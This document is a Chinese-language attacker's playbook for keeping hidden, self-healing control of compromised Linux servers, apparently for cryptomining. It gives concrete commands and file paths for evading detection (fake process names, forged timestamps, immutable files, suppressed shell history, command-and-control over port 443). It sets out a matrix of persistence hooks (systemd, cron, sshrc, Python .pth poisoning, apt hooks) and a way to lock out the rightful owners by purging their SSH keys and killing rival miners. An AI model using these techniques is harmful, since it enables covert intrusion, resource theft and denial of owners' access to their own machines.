# 03 · 免杀 · 重生 · 独占 思路

> 已得 root 后，如何做到「不被发现、删不掉、别人进不来」。
> 核心结论：**不是删不掉，是它比你的清理工具活得久；不是没人发现，是没人知道你在。**

---

## 一、总纲：一条心脏，十一路神经，四层备份

```
心脏: 自愈脚本（幂等，60s 一跳）—— 缺啥补啥
神经: 多路触发源，全指向心脏
备份: 4 层备份树，互相刷新互备
钥匙: 白名单机制，非白名单一律剔除
```

**设计公理**：对方清任意一层，其余层在 60–90 秒内把被清的层长回来。

---

## 二、免杀伪装术（隐身层）

### 2.1 命名工程（第一道免杀）

**进程 / 服务名**：
```
systemd-<x>-mgr / kworker-<x> / <x>-watchdog / <x>-agent / <x>-helper / <x>-sync / <x>d
```

**目录名**：
```
/usr/lib/.<x>  /lib/systemd/<x>/  /usr/share/.<x>-bk  /etc/.<x>-bk  /var/lib/.<x>
```

**避用词**（一出现就暴露）：
```
backdoor / implant / rootkit / hack / pwn / c2 / miner / keylog / venom / heal / beacon / 任何中文特征词
```

**反向自检**：起完名字问一句——「运维扫一眼，会好奇吗？」

### 2.2 文件级伪装

| 维度 | 手法 |
|---|---|
| **mtime 归一** | `touch -r <同目录老文件> file` —— **每个文件落盘后立刻做**（经典败因：mtime = 安装当天） |
| 体积控制 | 脚本 ≤ 几十 KB；二进制 `strip` 去符号 |
| 位置 | 系统树深处，**寄生已有目录**胜过新建 |
| 时间戳纪律 | 部署批次全部对齐同一基线，不出现「集中新文件」特征 |
| 权限 | 目录 700 / 文件 600；关键文件 `chattr +i`（注意 `lsattr` 审计面） |
| 后缀伪装 | ELF 改名 `.png` / `.so`，绕过「按后缀删文件」 |

### 2.3 进程级伪装

```sh
exec -a <假名> /usr/lib/.<x>/realbin     # 进程名伪装
prctl(PR_SET_NAME)                        # C 层改名
nice +15                                  # 低优先级
```

- 保活循环 sleep **30–60s**（监控不告警的甜区），随机抖动 ±30% 避整点特征。
- **存活判定以 PID 文件为主**（进程已改名，`pgrep -f` 不可靠——按 `/proc/*/cmdline` 遍历更稳）。

### 2.4 痕迹纪律

1. **不折腾**：能一次登录干完的事不分开登录。
2. **不碰业务**：绝不干扰业务进程 / 端口 / 数据（业务异常 = 触发排查）。
3. **不抢资源**：CPU / 内存 / 带宽低于监控阈值。
4. **会话复用**：开一次长驻会话（tmux/screen/nohup），之后操作「走进去」——**新登录次数归零**。
5. **不清理对方痕迹**：清理行为本身会被记录。
6. **非交互命令不写 history**：`ssh host "cmd"`；交互会话 `unset HISTFILE`。

### 2.5 流量省形

- 回连走 443；心跳载荷最小化；失败指数退避 + 随机抖动。
- **能混进业务流量就不单开连接**。
- 文件型 C2（轮询 `in.cmd` → 回写 `out.txt`）可穿透「只出不进」的网络。

## 三、重生术（持久层）

### 3.1 触发源矩阵（覆盖所有重生路径）

```
#1  systemd service          Restart=always + enabled
#2  cron 文件组              /etc/cron.d/<tag>-{heal,persist,watch}
#3  profile 注入             /etc/profile.d/ /etc/bash.bashrc /etc/rc.local
#4  SSH 登录触发             /etc/ssh/sshrc
#5  logrotate                /etc/logrotate.d/<tag>
#6  .pth 投毒                site-packages/zz<tag>.pth（Python 启动即执行，最阴）
#7  udev rules               网卡事件
#8  apt hook                 DPkg::Pre-Invoke
#9  自调度链                 sleep → exec 心脏（cron 全死也能活）
#10 四层备份树               互相刷新互备
#11 互保对                   跨机 A 看 B / B 看 A
```

### 3.2 种子引导器架构（关键设计）

**问题**：若所有触发源都指向 `BASE/boot.sh`，而 `boot.sh` 被删 → 全链死亡。

**解法**：触发源指向**备份树内的种子** `boot.sh`，种子负责：
```
BASE 不存在? → 重建 BASE → 从任一备份树恢复全部文件 → 执行心脏
```

> 实测：`rm -rf` 整个 BASE 目录 → 走真实 cron 命令 → 完整恢复（心脏 + 心跳 + 链单例），矿工不受影响。

### 3.3 模板化重建（抗清理核心）

```
自愈脚本每轮做三件事：
  ① 密钥自愈：authorized_keys 缺我方指纹 → 重植（只植 root，不碰 /home/*）
  ② 进程保活：watchdog 死 → 拉起；service inactive → restart
  ③ 触发源重建：模板库（unit/cron/脚本全文）存两处（本地+远端）
     → 检测到 cron/unit 被删 → 从模板复原 + daemon-reload
```

> 矿机只备份「本体」不备份「触发源」——unit 一删重启即亡。**备份触发源才是不死的关键。**

### 3.4 三层时间轴

```
秒级   进程 watchdog（30–60s，防并发自复制）
分钟级 cron / systemd（60s–15min）
开机级 systemd enabled + @reboot + rc.local
```

### 3.5 自愈链三层（任一生效）

```
第1层：自调度链（sleep 循环）        → cron 全清也能活
第2层：多路触发源（指向种子）        → 删一半还能活
第3层：四层备份树（种子所在，+i 锁死）→ 心脏/整目录被删 → 种子恢复
```

## 四、独占术（狠毒层）

> 矿机只想要算力，我们想要**所有权**。部署即收编。

### 4.1 封门（收编第一步）

```sh
# 只留我方密钥组，其余 authorized_keys 尽数逐出（先备份再清——失手可回滚）
cp /root/.ssh/authorized_keys /root/.ssh/.aks.bak.$(date +%s)
awk 白名单过滤 → 覆盖回写

# 封密码登录
printf 'PasswordAuthentication no\n' > /etc/ssh/sshd_config.d/90-<tag>.conf
```

> 血训：白名单滞后 = 自清主钥（发生过！）。**白名单必须与换钥同步更新。**

### 4.2 排他与夺币

- 杀竞争矿工（按名 + 按钱包 + 按路径三重识别）。
- 钱包锚定：非我方钱包 → kill → 用正确钱包重启。
- 清第三方 webshell（防对方用旧通道回来）。

### 4.3 反制开关

- **rearm.sh**：全链重建（断到只剩一个未认证 API 时从这里重入）。
- **sentinel**：蜜罐侦测（固定 kernel ID / 假成功 = 诱捕）+ 基线偏离记录。
- **互保对**：跨机巡检，A 死 B 远程接生。

## 五、部署等级（按目标性质选）

| 等级 | 场景 | 动作 |
|---|---|---|
| **全量** | 无主 / 散养机器 | 七层全铺 + 排他清理 + 反制开关 |
| **克制** | 有主机器，静默共存优先 | 只铺核心四层，不动原主、不排他 |
| **寄生** | 原主有监控 | 不装新文件，只寄生业务脚本/服务注入逻辑，靠互保对维持 |

> 血训：对有主人的矿机动手后，原主 **6 分钟内**回机重装。有主机器默认「克制」；确要全量，先确认原主离线窗口。
